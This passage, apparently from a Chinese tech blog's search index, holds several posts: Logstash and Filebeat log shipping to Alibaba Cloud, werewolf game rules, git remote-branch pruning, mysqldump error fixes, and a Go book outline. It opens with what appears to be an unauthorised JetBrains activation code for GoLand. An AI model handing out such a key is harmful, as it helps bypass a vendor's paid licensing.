b2/iuK36Q1NCuhKGlo8mA68kGXLOk5ppRYCqQUnHY2zk8spzxC/yJtG+JAQGlPDyvQmkQ5taRxM77b1/v2/62t5Xa2HqnPkuJBrS+XXuGz++RBuYEv6cVe5hmsUaQJZe9/Z4BrhMy48fVEG6bsKTmJ4yILs9sSyUM6uA05AOm8lXWmCG3m9AdVyawsWqBJIn7Rw==-MIIElTCCAn2gAwIBAgIBCTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE4MTEwMTEyMjk0NloXDTIwMTEwMjEyMjk0NlowaDELMAkGA1UEBhMCQ1oxDjAMBgNVBAgMBU51c2xlMQ8wDQYDVQQHDAZQcmFndWUxGTAXBgNVBAoMEEpldEJyYWlucyBzLnIuby4xHTAbBgNVBAMMFHByb2QzeS1mcm9tLTIwMTgxMTAxMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQAF8uc+YJOHHwOFcPzmbjcxNDuGoOUIP+2h1R75Lecswb7ru2LWWSUMtXVKQzChLNPn/72W0k+oI056tgiwuG7M49LXp4zQVlQnFmWU1wwGvVhq5R63Rpjx1zjGUhcXgayu7+9zMUW596Lbomsg8qVve6euqsrFicYkIIuUu4zYPndJwfe0YkS5nY72SHnNdbPhEnN8wcB2Kz+OIG0lih3yz5EqFhld03bGp222ZQCIghCTVL6QBNadGsiN/lWLl4JdR3lJkZzlpFdiHijoVRdWeSWqM4y0t23c92HXKrgppoSV18XMxrWVdoSM3nuMHwxGhFyde05OdDtLpCv+jlWf5REAHHA201pAU6bJSZINyHDUTB+Beo28rRXSwSh3OUIvYwKNVeoBY+KwOJ7WnuTCUq1meE6GkKc4D/cXmgpOyW/1SmBz3XjVIi/zprZ0zf3qH5mkphtg6ksjKgKjmx1cXfZAAX6wcDBNaCL+Ortep1Dh8xDUbqbBVNBL4jbiL3i3xsfNiyJgaZ5sX7i8tmStEpLbPwvHcByuf59qJhV/bZOl8KqJBETCDJcY6O2aqhTUy+9x93ThKs1GKrRPePrWPluud7ttlgtRveit/pcBrnQcXOl1rHq7ByB8CFAxNotRUYL9IF5n3wJOgkPojMy6jetQA5Ogc8Sm7RG6vg1yow== 激活码由https://blog.csdn.net/qq_41570658/article/details/85708172大佬提供\n","permalink":"https://www.fenghong.tech/blog/tools/goland-install/","tags":["goland"],"title":"Go 开发工具安装"},{"categories":["ops"],"contents":" LogStash 可以用来对日志进行收集并进行过滤整理后输出到 ES 中，FileBeats 是一个更加轻量级的日志收集工具。 现在最常用的方式是通过 FileBeats 收集目标日志，然后统一输出到 LogStash 做进一步的过滤，在由 LogStash 输出到 ES 中进行存储。\n 官方提供了压缩包下载， https://www.elastic.co/downloads/logstash 。 下载完成后解压即可。 下载后,解压缩\n$ tar xf logstash-6.4.3.tar.gz -C /usr/local $ mv logstash-6.4.3 logstash logstash必须运行在java环境中,.下载jdk\n$ vi /etc/profile export JAVA_HOME=/usr/local/jdk1.8.0_91 export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar export PATH=$PATH:$JAVA_HOME/bin 输入 java -version若看到如下信息，则java环境配置成功\n$ java -version java version \u0026#34;1.8.0_91\u0026#34; Java(TM) SE Runtime Environment (build 1.8.0_91-b14) Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode) 将本地的log4j或者nginx日志传输至logstash。\n 本地测试  $ cat config/simple.conf input { stdin {} } output { stdout { codec =\u0026gt; rubydebug } }  日志上传至阿里云服务  # cat config/www.conf input { file { path=\u0026gt; [ \u0026#34;/udisk/log4j/borrowWap/*.log\u0026#34;, \u0026#34;/udisk/log4j/cron/*.log\u0026#34;, \u0026#34;/udisk/log4j/manage/*.log\u0026#34;, \u0026#34;/udisk/log4j/rms/*.log\u0026#34;, \u0026#34;/udisk/log4j/wap/*.log\u0026#34;, \u0026#34;/udisk/log4j/www/*.log\u0026#34; ] } } filter { date { match =\u0026gt; [ \u0026#34;timestamp\u0026#34;, \u0026#34;dd/MMM/yyyy:HH:mm:ss Z\u0026#34; ] } multiline { pattern =\u0026gt; \u0026#34;^[^\\[]\u0026#34; what =\u0026gt; \u0026#34;previous\u0026#34; } if [message] =~ \u0026#34;\\[ERR\\]\u0026#34; and [message] !~ \u0026#34;404 Page\u0026#34; { mutate { add_tag =\u0026gt; \u0026#34;ERROR\u0026#34; remove_tag =\u0026gt; \u0026#34;mutiline\u0026#34; } } if [message] =~ \u0026#34;\\[WARNING\\]\u0026#34; and [message] !~ \u0026#34;AVG\u0026#34;{ mutate { add_tag =\u0026gt; \u0026#34;WARNING\u0026#34; remove_tag =\u0026gt; \u0026#34;mutiline\u0026#34; } } } output { logservice { endpoint =\u0026gt; \u0026#34;http://cn-shanghai.log.aliyuncs.com\u0026#34; project =\u0026gt; \u0026#34;******\u0026#34; logstore =\u0026gt; \u0026#34;*****\u0026#34; topic =\u0026gt; \u0026#34;\u0026#34; source =\u0026gt; \u0026#34;\u0026#34; access_key_id =\u0026gt; \u0026#34;********************\u0026#34; access_key_secret =\u0026gt; \u0026#34;*******************\u0026#34; max_send_retry =\u0026gt; 10 } if \u0026#34;ERROR\u0026#34; in [tags] { email { to =\u0026gt; \u0026#34;hongfeng@qianxiangbank.com\u0026#34; from =\u0026gt; \u0026#34;alilog@qianxiangbank.com\u0026#34; address =\u0026gt; \u0026#34;smtp.mxhichina.com\u0026#34; username =\u0026gt; \u0026#34;alilog@qianxiangbank.com\u0026#34; password =\u0026gt; \u0026#34;**************\u0026#34; via =\u0026gt; \u0026#34;smtp\u0026#34; subject =\u0026gt; \u0026#34;ERROR on the qianxiang-pc\u0026#34; body =\u0026gt; \u0026#34; server_ip:****** \\n message: %{message} ; \\n path: %{path}; \\n url: https://sls.console.aliyun.com/****\u0026#34; } } if \u0026#34;WARNING\u0026#34; in [tags] { email { to =\u0026gt; \u0026#34;hongfeng@qianxiangbank.com\u0026#34; from =\u0026gt; \u0026#34;alilog@qianxiangbank.com\u0026#34; address =\u0026gt; \u0026#34;smtp.mxhichina.com\u0026#34; username =\u0026gt; \u0026#34;alilog@qianxiangbank.com\u0026#34; password =\u0026gt; \u0026#34;**************\u0026#34; via =\u0026gt; \u0026#34;smtp\u0026#34; subject =\u0026gt; \u0026#34;ERROR on the qianxiang-pc\u0026#34; body =\u0026gt; \u0026#34; server_ip:****** \\n message: %{message} ; \\n path: %{path}; \\n url: https://sls.console.aliyun.com/****\u0026#34; } } } 因为java的日志分多行，这里必须得统计在一起，才有意义。刚好logstash提供这个功能，multiline ，首行匹配^[^[]，即可认为是新行。\ngork日志分析正则debug地址(需要翻墙)：gork debug\n例如下面这个日志\n[INFO]2018-12-03 00:00:00 --------------我是:defaultSource - com.qianxiang.aop.mysql.intercept.DataSourceAspect [INFO]2018-12-03 00:00:00 --------------我是:defaultSource - com.qianxiang.aop.mysql.intercept.DataSourceAspect [INFO]2018-12-03 00:00:00 --------------我是:slave - com.qianxiang.aop.mysql.intercept.DataSourceAspect [INFO]2018-12-03 00:00:00 --------------我是:defaultSource - com.qianxiang.aop.mysql.intercept.DataSourceAspect [INFO]2018-12-03 00:00:00 --------------我是:slave - com.qianxiang.aop.mysql.intercept.DataSourceAspect [INFO]2018-12-03 00:00:00 --------------我是:slave - com.qianxiang.aop.mysql.intercept.DataSourceAspect [INFO]2018-12-03 00:00:00 --------------我是:slave - com.qianxiang.aop.mysql.intercept.DataSourceAspect [INFO]2018-12-03 00:00:00 --------------我是:slave - com.qianxiang.aop.mysql.intercept.DataSourceAspect [INFO]2018-12-03 00:00:00 now_start:2018-12-03 00:00:00;now_end:2018-12-03 17:00:00 - com.qianxiang.web.business.bill.service .impl.TUserWithdrawalsServiceImpl [INFO]2018-12-03 00:00:00 分页总数sql:select count(0) from (select r.id, r.invest_id as investId, r.red_package_cnt-r.has_cnt as hasCnt, r.red_package_cnt as redPackageCnt, r.red_package_total as redPackageTotal, CAST((r.has_cnt+1)/2 AS signed) as selfCnt, r.has_cnt as useCnt, r.time, [INFO]2018-12-03 00:00:00 --------------我是:slave - com.qianxiang.aop.mysql.intercept.DataSourceAspect 这个时候，多行合并就显得很关键。\nfilter { multiline { pattern =\u0026gt; \u0026quot;^[^\\[]\u0026quot; what =\u0026gt; \u0026quot;previous\u0026quot; } } 测试logstash的时候可以用--configtest 或者-t,来检测配置文件的语法是否有错误，类似nginx -t\n$ ./bin/logstash -f ./config/sample.conf --configtest #未安装插件会报错 $ ./bin/logstash -f ./config/sample.conf -t [2019-04-26T14:28:00,738][ERROR][org.logstash.Logstash ] java.lang.IllegalStateException: Logstash stopped processing because of an error: (SystemExit) exit #安装阿里云logstash-output-logservice插件 $ ./bin/logstash-plugin install logstash-output-logservice Validating logstash-output-logservice Installing logstash-output-logservice Installation successful #安装mutiline插件 $ ./bin/logstash-plugin install logstash-filter-multiline Validating logstash-filter-multiline Installing logstash-filter-multiline Installation successful ","permalink":"https://www.fenghong.tech/blog/2018/2018-12-03-logstash-elk/","tags":["elk","logstash","log","aliYun"],"title":"logstash初探"},{"categories":["games"],"contents":"[TOC]\n起源 狼人起源于很久以前的欧洲，那时候由于瘟疫，村子里只活下来一个年轻人。他的后代有三个（不知道是和谁恋爱生的孩子， 因为是“只活下来一个年轻人”）。一个被毒蝙蝠咬了，一个让毒狼咬了，只有一个比较正常。前两位一个是吸血鬼的祖先，一个是狼人祖先。 狼人可以活到100岁，肉食，月圆之夜会变成狼的形态，平时却和普通人一样。鉴别狼人的唯一方法是：狼人在人的状态时中指与无名指的长度相同，看到这儿，请大家互相检查，如有符合此条件的人，请悄悄报警。（玩笑话） 狼人害怕银制品，液态的硝酸银可以使他们丧失战斗力！请善良的村民夜路自备。如果实在找不到硝酸银的话，一般的银器也可以使狼人感到巨大的灼痛。 被狼人咬伤不死的人会变成狼人，请记住，平常的日子里狼人看起来和我们一样善良，有很多就生活在我们身边！他们行为举止温文尔雅，甚至穿西装戴眼镜儿说话没有脏字儿……但也有很多狼人生活在郊外森林里。 狼人变身后是没有理智的，杀了人也不知道。但少数理智的善良的狼人为了控制自己不伤害人，晚上变身的时候会去一个荒无人烟的地方，避免伤害人类。所以，如果你身边有那种喜欢晚上去森林里，早晨回来，并周期性重复这个行为的人，有可能就是一个善良的狼人。 据说，狼人变身的时候因身体结构发生翻天覆地的变化而感到非常痛苦，相当于重度抽筋儿的感觉（描述这个感受的人如果不是狼人，可能有臆想症……）。\n面杀 说到狼人杀，玩狼人杀有几个特色，特别是拿到狼人牌的时候，心跳会加速~\n 锻炼自己的语言能力 锻炼自己的逻辑思维 如何骗人  游戏开始，君子游戏。\n  法官宣布“天黑请闭眼”，此时所有玩家都闭眼，进入天黑（夜晚）阶段。随后法官宣布“情侣请闭眼”。\n  法官宣布“守卫睁眼”，问守卫本轮会守护哪个人。（守卫不知道他保护的人的身份，或是否是被杀死的。）\n  法官宣布“预言家请睁眼”，预言家睁眼指定一名玩家，法官把该玩家的身份牌给预言家看，看完后身份牌放回原处，牌面向下。 随后法官宣布“预言家请闭眼”。\n  法官宣布“狼人睁眼”，狼人睁眼相互确认，法官宣布“狼人开始杀人”，狼人一起指定一名玩家，该玩家在天亮时会死去。 此时小女孩可以偷看。随后法官宣布“狼人请闭眼”。\n  法官宣布“女巫睁眼”，法官用手势告诉女巫刚才狼人杀死的是谁。女巫可以使用药剂，也可以不使用。 如果女巫要使用药剂，则拇指向上表示用解药，救刚才被狼人杀死的人；拇指向下表示使用毒药，并且用手势告诉法官，要在哪位玩家身上使用毒药。 被使用了毒药的玩家，天亮时死去。随后法官宣布“女巫闭眼”。\n  法官宣布“所有玩家闭眼竞选警长”。此时需要竞选警长的玩家举手，之后法官宣布“天亮，所有玩家睁眼”， 此时全体玩家睁眼后，进入竞选警长阶段，如果没有玩家上警，则本局无警徽，如果只有一名玩家上警，则自动当选警长， 如果全部玩家均参与警长竞选，则所有玩家进行一轮发言，若最后只有一名玩家未退选，则自动当选警长，否则本局游戏没有警长。 举手的玩家按当前时间单顺双逆的顺序进行发言，例如当前时间15:25，尾数 5 为单数，若 1/4/5/7/8/12 五位玩家选择上警， 那么以单顺双逆的发言顺序，1/4/7/8/12 顺序发言，若时间 15:26，那么 12/8/7/4/1 逆序发言。警上发言结束后，法官宣布“退水时间”， 上警玩家可以在任意玩家发言时选择退水，也可以选择在法官宣布后退水，都视为退水成功，所有退水的玩家视为放弃竞选警长，且不能投警长票， 随后法官宣布“所有警下玩家闭眼投票”，之后，得票最多的玩家当选警长，如果没有玩家投票，则本局无警徽，如果有两位及以上的玩家平票，则PK 发言， 发言完毕后进入 PK 投票，退水玩家依旧不能投票，若 PK 阶段再次平票，则本局游戏没有警徽。狼人可以在警长竞选阶段（包括警长PK 阶段）自爆， 则本局无警徽。警长由于任何原因死亡时，均可以移交警徽或撕掉警徽，获得警徽的玩家继任为新警长，警徽撕毁后，本局游戏将没有警长。警长不得抢先发言。\n  法官确定昨夜死亡情况后，报出昨夜死亡情况，若昨晚有玩家死亡，则法官宣布“昨夜 x 号玩家死亡”，如果出现多死的情况， 法官将按照玩家号码从小到大的顺序公布夜晚死亡情况，与死亡顺序无关！若没有玩家死亡则法官宣布“昨晚平安夜”。\n  遗言结束后，法官安排白天发言阶段，所有玩家按【发言规则】发言，发言结束后，开始放逐投票。投票时，警长视为1.5 票。 当发生平票时，进入平票 PK。PK 台上玩家再进行一轮发言，然后 PK 台下的玩家投票，PK 台上玩家不能投票。若再次平票， 则当天平安日，即白天无人出局，直接进入天黑。在任何投票阶段，玩家都可以选择弃票。出局玩家此后不得与其他玩家有任何交流。\n  法官宣布“天黑请闭眼”，所有人闭上眼睛，接着循环前面的步骤，直到游戏结束。\n  身份  平民  本身没有任何能力，一觉睡到天亮却要考虑很多事情。平民会接收到真假混杂的信息，需要从中分辨和判断出正确的信息。简介玩法\n 狼人  每天晚上会残忍地杀害一个村民，到了白天，狼人要假扮村民隐藏自己的身份，故意误导或陷害其他村民。\n 预言家  每晚预言家可以窥视一个玩家的真实身份，是村庄里的灵魂人物。预言家要思考如何帮助村民的同时又不被狼人发现自己的身份。高阶玩法请看\n 女巫  女巫拥有两瓶药，解药可以救活一名当晚被狼人杀害的玩家，毒药可以毒杀一名玩家，女巫在每天晚上最多使用一瓶药，女巫不可自救。高阶玩法请看\n 猎人  当猎人被狼人杀害或被村民处决时，他可以射杀任意一个玩家。 但当猎人由于意外死亡（如女巫的毒药或者被殉情而死）他不可在死前射出子弹。\n 守卫  每晚守卫暗中指定一个玩家，该玩家当晚会受到保护，不会被狼人杀害，守卫不能连续两晚守卫同一个人，守卫可以守卫自己。 （注：部分局规定若女巫的救人与守卫守护的人为同一人，则判定该位玩家因同守同救而死亡）\n 白痴  白痴若是被投票出局，可以翻开自己的身份牌，免疫此次放逐，之后可以正常发言，但不能投票，狼人仍需要击杀他一次才能让他死亡。 但若是白痴因非投票原因死亡，则无法发动技能，立即死亡。高阶玩法\n术语  上警  全体玩家将在第一次天亮后投票选举出警长。 选择上警的玩家，成为警长候选人并发表竞选发言 。 警长一旦被选出，当选玩家不可再拒绝该身份。  金水  预言家夜晚验人，验出来的好人身份，昨天晚上我验的1号牌，是我的金水。  银水  在排除狼自刀的情况下,女王晚上用解药救的人，称之为银水， 昨天晚上我救的2号牌，是我的银水。  查杀  预言家夜晚验人，验出来的狼人身份，昨天晚上我验的1号牌，是我的查杀。 双查杀：被两位跳预言家的玩家都发了查杀的玩家  悍跳狼  我是预言家，在警上发言的时候，有对跳预言家身份牌的，称之为悍跳狼。  铁狼  绝对的狼人  反水  一般指自称预言家的玩家 A 声称验了另一名玩家 B 为金水， 但是 B 不认可 A 的预言家身份并反对 A， 这种行为叫做反水。警上发言前置位给金水， 不接这个金水，且警上不退水,而且前置位跳预言家（反水立警）  站边  通常指游戏里有两个人对跳时，选择相信其中一方的行为。 软站边：暂时站边某一个预言家但是依旧保持一定程度的怀疑 死站边、铁站边：完全站边某一个预言家 站对边：站边了真预言家 站错边：站边了悍跳狼  表水  在被人怀疑是坏人后，努力辩白自己是好人身份。  接金水、喝金水：  表示被发金水的玩家认可发自己金水的预言家是真预言家 端金水：表示被发金水的玩家不确定发自己金水的预言家是否是真预言家 双金水：被两位跳预言家的玩家都发了金水的玩家  警徽  指预言家拿到警徽报验人，这样即使被刀了也可以通过传递警徽来多透露出一晚的验人信息 退水：竞选警长的玩家在警上发言完毕之后决定退出竞选的行为称之为退水。 第一警徽流 ：预言家下一个晚上要去验的对象 第二警徽流：预言家再下一个晚上要去验的对象 吞警徽：在警上竞选警长发言阶段有狼自爆，则本局游戏没有警徽。 飞警徽：警长出局后移交警徽给另外的玩家 撕警徽：警长出局后选择不移交警徽 在放逐公投中放逐警长 参考  百度百科 switchmag.co  ","permalink":"https://www.fenghong.tech/blog/games/langrensha/","tags":["games"],"title":"LangRenSha"},{"categories":["ops"],"contents":"[TOC]\ngit 远程分支清理。 远程分支的查看只需要在 git branch 命令加一个 -r(--remotes) 参数即可\ngit branch -r 远程分支的清理，一方面是清理远程分支中，已经合入 master 的分支，另一方面是清理远程仓库已经删除了的分支，而本地还在跟踪的。\n事实上，我们可以在每次 git fetch 时，添加一个参数 -p (--prune)，这样每次 fetch 远程仓库时都可以顺手删掉本地多余的分支（建议将 git fetch -p 直接 alias 到 git fetch 命令~）。\n再来看第一种情况，虽然同样可以通过 git branch -r --merged 来查看已经合入 master 的分支，但由于远程分支不只是自己开发的，所以还需要别人的确认才能进行删除。 好在我们可以在命令行的帮助下快速筛选出每个人的分支，然后就可以把这份统计摘要发给 TA 来确认。\nfor branch in `git branch -r --merged | grep -v HEAD`; do echo -e `git show --format=\u0026quot;%ci %cr %an\u0026quot; $branch | head -n 1`; done | sort -r | grep AUTHOR_NAME 如果想查看更多的信息，可以在 git show 的 format 加上 %s（提交信息）和 %h（commit SHA1 前缀）\ngit remote prune origin 第二种情况的清理非常简单，只需要执行\n$ git remote prune origin --dry-run Pruning origin URL: http://*************************/qianxiang/web.git * [would prune] origin/0627_allen * [would prune] origin/develop_09061904_evan_julebu * [would prune] origin/feature_02211355_1000298_video * [would prune] origin/feature_06261651 * [would prune] origin/feature_06271046_dengebenxi * [would prune] origin/feature_06271105 * [would prune] origin/feature_06271105_evan_julebu * [would prune] origin/feature_06271228 * [would prune] origin/feature_06271336 * [would prune] origin/feature_06271341 * [would prune] origin/feature_06281159_evan_fengkong4 * [would prune] origin/feature_06281159_evan_fengkong4_mike * [would prune] origin/feature_07031939_summer * [would prune] origin/feature_07051049 * [would prune] origin/feature_07060945 * [would prune] origin/feature_07061030_jiekuan * [would prune] origin/feature_07091425 * [would prune] origin/feature_07101552 * [would prune] origin/feature_07111011_hongbao * [would prune] origin/feature_07161028_duxie * [would prune] origin/feature_07181505 * [would prune] origin/feature_07191242 * [would prune] origin/feature_07191545 * [would prune] origin/feature_07201343_yemian * [would prune] origin/feature_07201413_fabu --dry-run,仅是干跑一次，查询一下需要清理的分支。 如果需要整体清理\n$ git remote prune origin ","permalink":"https://www.fenghong.tech/blog/intro/git_clean_remote/","tags":["git"],"title":"git 远程分支清理"},{"categories":["mysql"],"contents":"近期mysql数据库报错，及解决方案；记录一下\nmysql报错汇总 626\nmysqldump: Error 2020: Got packet bigger than 'max_allowed_packet' bytes when dumping table `blt_bulletinannex` at row: 626 报错条件：一般是存在blob，text等字段，单条记录超过默认的24M 解决措施：mysqldump调大max_allow_packet参数，在服务器端修改这个参数无效\n1143\nmysqldump: Couldn't execute 'show table status like 'members\\_ban\\_user\\_view'': SELECT command denied to user ''@'%' for column 'user_id' in table 'members_ban_log' (1143) 报错条件：相应的视图的账户给的权限不足；或者是用户不存在 解决措施：需要视图定义账户的Create_view_priv和Show_view_priv权限；或者添加对应的用户和权限；删除该视图\n1146\nmysqldump: Couldn't execute 'show create table `innodb_index_stats`': Table 'MySQL.innodb_index_stats' doesn't exist (1146) 报错条件：mysql5.6，系统表损坏，该表是innodb引擎 解决措施：物理删除该表的frm文件和ibd文件，找到系统表的定义sql，重建系统表\n解决措施：删除或修改出问题的视图定义语句\n1045\nmysqldump: Got error: 1045: Access denied for user 'ucloudbackup'@'10.10.1.242' (using password: YES) when trying to connect 报错条件：无法连接，密码，账户，host，port有问题 解决措施：先保证mysql能正常连接\n145\nmysqldump: Couldn't execute 'show create table `userarenalog`': Table './tank_11/userarenalog' is marked as crashed and should be repaired (145) 报错条件：myisam表损坏 解决措施：repair table XXX修复损坏的表，最好mysqlcheck一下所有表\n126\nmysqldump: Couldn't execute 'show fields from `TB_CROWDFUNDING_PROJECT`': Incorrect key file for table 'ql-5.5/14310da6-644a-472a-b170-0e7e75cfda87/tmp/#sql_32606_0.MYI'; try to repair it (126) 报错条件：临时表使用过程中/tmp空间不足，导致myisam临时表损坏 解决措施：增大磁盘空间就好\n1548\nmysqldump: Couldn't execute 'SHOW FUNCTION STATUS WHERE Db = 'analysis'': Cannot load from mysql.proc. The table is probably corrupted (1548) 报错条件：升级导致 解决措施：运行mysql_upgrade更新db，或者更新对应版本的mysql.proc表结构 5.1执行\nmysql\u0026gt; alter table mysql.proc MODIFY COLUMN `comment` char(64) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL AFTER `sql_mode`; 5.5执行\nmysql\u0026gt; alter table mysql.proc MODIFY COLUMN `comment` text CHARACTER SET utf8 COLLATE utf8_bin NOT NULL AFTER `sql_mode`; 1577\nmysqldump: Couldn't execute 'show events': Cannot proceed because system tables used by Event Scheduler were found damaged at server start (1577) 报错原因：不合理的升级mysql版本导致 解决措施：先mysql_upgrade,不行再重启db看看(不大确定)\n1064\nmysqldump: Couldn't execute 'SHOW FUNCTION STATUS WHERE Db = 'mysql'': You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1 (1064) 报错原因：select * from information_schema.ROUTINES limit 1报一样的错误 再查看mysql.proc表发现有函数或者存储过程定义有问题，比如根本不存在的db或者user出现在定义中，猜测是备份时没有加-R参数，直接导入到db后没有正常建立对应的函数或存储过程导致的 解决措施：先尝试drop语法删除mysql.proc中定义有问题的函数或存储过程记录，如果不行就直接delete from的方式删除\n2013\nmysqldump: Error 2013: Lost connection to MySQL server during query when dumping table `vitality_flow` at row: 31961089 报错原因：1 该表是分区表 2 该表是innodb，存在大量的blob text等字段 3 上传NFS或者边备份边压缩 解决措施：针对1和3的原因，需要调大net_write_timeout参数；针对2的原因，需要调大max_allow_packet；\n2013\nmysqldump: Couldn't execute 'SELECT DISTINCT TABLESPACE_NAME, FILE_NAME, LOGFILE_GROUP_NAME, EXTENT_SIZE, INITIAL_SIZE, ENGINE FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA IN ('15616156','mysql','test','wx00','wx01','wx02','wx03','wxid')) ORDER BY TABLESPACE_NAME, LOGFILE_GROUP_NAME': Lost connection to MySQL server during query (2013) 报错原因：备份过程中因内存不足而oom 解决措施：加大内存\n1213\nmysqldump: Couldnt execute show create table `shop_his_9`: Deadlock found when trying to get lock; try restarting transaction (1213) fails 报错原因：mysqldump过程中发生死锁 解决措施：重试即可\n1049\nmysqldump: Got error: 1049: Unknown database cfcara when selecting the database fails 报错原因：随意修改大小写敏感问题导致 解决措施：先解决大小写问题\n1045\nmysqldump: Couldn't execute 'STOP SLAVE SQL_THREAD': Access denied for user 'root'@'172.19.%.%' (using password: NO) (1045) 报错原因：从库备份，备份账户权限不足，无法登陆\n1168\nmysqldump: Couldnt execute show create table `sk_order_38`: Unable to open underlying table which is differently defined or of non-MyISAM type or doesnt exist (1168) fails 报错原因：mrg表定义出错导致的吧 解决措施：把这个表删除\n启动服务失败\nERROR! The server quit without updating PID file (/udisk/mysql/mysql/qx_sit.pid). 报错原因： 权限错误 解决措施：\n# chown -R mysql.mysql /data/mysql/ 1820 安装数据库时，必须修改密码才可以执行sql语句。\nmysql\u0026gt; SELECT 1; ERROR 1820 (HY000): You must SET PASSWORD before executing this statement mysql\u0026gt; SET PASSWORD = PASSWORD('new_password'); Query OK, 0 rows affected (0.01 sec) 1418 在导入数据的时候，报如下错误。\nERROR 1418 (HY000) at line 22997: This function has none of DETERMINISTIC, NO SQL, or READS SQL DATA in its declaration and binary logging is enabled (you *might* want to use the less safe log_bin_trust_function_creators variable) ##解决措施 $ mysql -uroot -p mysql\u0026gt; SET GLOBAL log_bin_trust_function_creators = 1; ","permalink":"https://www.fenghong.tech/blog/2018/2018-11-15-mysql-11/","tags":["Linux","mysql","error"],"title":"mysql常见错误汇总及解决方案"},{"categories":["go"],"contents":"github 源码地址\n目录  前言  第一部分：学习 Go 语言   第1章：Go 语言的起源，发展与普及\n 1.1 起源与发展 1.2 语言的主要特性与发展的环境和影响因素    第2章：安装与运行环境\n 2.1 平台与架构 2.2 Go 环境变量 2.3 在 Linux 上安装 Go 2.4 在 Mac OS X 上安装 Go 2.5 在 Windows 上安装 Go 2.6 安装目录清单 2.7 Go 运行时（runtime） 2.8 Go 解释器    第3章：\n编辑器、集成开发环境与其它工具\n 3.1 Go 开发环境的基本要求 3.2 编辑器和集成开发环境 3.3 调试器 3.4 构建并运行 Go 程序 3.5 格式化代码 3.6 生成代码文档 3.7 其它工具 3.8 Go 性能说明 3.9 与其它语言进行交互    第二部分：语言的核心结构与技术   第4章：基本结构和基本数据类型\n 4.1 文件名、关键字与标识符 4.2 Go 程序的基本结构和要素 4.3 常量 4.4 变量 4.5 基本类型和运算符 4.6 字符串 4.7 strings 和 strconv 包 4.8 时间和日期 4.9 指针    第5章：\n控制结构\n 5.1 if-else 结构 5.2 测试多返回值函数的错误 5.3 switch 结构 5.4 for 结构 5.5 Break 与 continue 5.6 标签与 goto    第6章：\n函数（function）\n 6.1 介绍 6.2 函数参数与返回值 6.3 传递变长参数 6.4 defer 和追踪 6.5 内置函数 6.6 递归函数 6.7 将函数作为参数 6.8 闭包 6.9 应用闭包：将函数作为返回值 6.10 使用闭包调试 6.11 计算函数执行时间 6.12 通过内存缓存来提升性能    第7章：\n数组与切片\n 7.1 声明和初始化 7.2 切片 7.3 For-range 结构 7.4 切片重组（reslice） 7.5 切片的复制与追加 7.6 字符串、数组和切片的应用    第8章：\nMap\n 8.1 声明、初始化和 make 8.2 测试键值对是否存在及删除元素 8.3 for-range 的配套用法 8.4 map 类型的切片 8.5 map 的排序 8.6 将 map 的键值对调    第9章：\n包（package）\n 9.1 标准库概述 9.2 regexp 包 9.3 锁和 sync 包 9.4 精密计算和 big 包 9.5 自定义包和可见性 9.6 为自定义包使用 godoc 9.7 使用 go install 安装自定义包 9.8 自定义包的目录结构、go install 和 go test 9.9 通过 Git 打包和安装 9.10 Go 的外部包和项目 9.11 在 Go 程序中使用外部库    第10章：\n结构（struct）与方法（method）\n 10.1 结构体定义 10.2 使用工厂方法创建结构体实例 10.3 使用自定义包中的结构体 10.4 带标签的结构体 10.5 匿名字段和内嵌结构体 10.6 方法 10.7 类型的 String() 方法和格式化描述符 10.8 垃圾回收和 SetFinalizer    第11章：\n接口（interface）与反射（reflection）\n 11.1 接口是什么 11.2 接口嵌套接口 11.3 类型断言：如何检测和转换接口变量的类型 11.4 类型判断：type-switch 11.5 测试一个值是否实现了某个接口 11.6 使用方法集与接口 11.7 第一个例子：使用 Sorter 接口排序 11.8 第二个例子：读和写 11.9 空接口 11.10 反射包 11.11 Printf 和反射 11.12 接口与动态类型 11.13 总结：Go 中的面向对象 11.14 结构体、集合和高阶函数    第三部分：Go 高级编程  第12章：读写数据  12.1 读取用户的输入 12.2 文件读写 12.3 文件拷贝 12.4 从命令行读取参数 12.5 用 buffer 读取文件 12.6 用切片读写文件 12.7 用 defer 关闭文件 12.8 使用接口的实际例子：fmt.Fprintf 12.9 格式化 JSON 数据 12.10 XML 数据格式 12.11 用 Gob 传输数据 12.12 Go 中的密码学   第13章：错误处理与测试  13.1 错误处理 13.2 运行时异常和 panic 13.3 从 panic 中恢复（Recover） 13.4 自定义包中的错误处理和 panicking 13.5 一种用闭包处理错误的模式 13.6 启动外部命令和程序 13.7 Go 中的单元测试和基准测试 13.8 测试的具体例子 13.9 用（测试数据）表驱动测试 13.10 性能调试：分析并优化 Go 程序   第14章：协程（goroutine）与通道（channel）  14.1 并发、并行和协程 14.2 使用通道进行协程间通信 14.3 协程同步：关闭通道-对阻塞的通道进行测试 14.4 使用 select 切换协程 14.5 通道，超时和计时器（Ticker） 14.6 协程和恢复（recover） 14.7 新旧模型对比：任务和worker 14.8 惰性生成器的实现 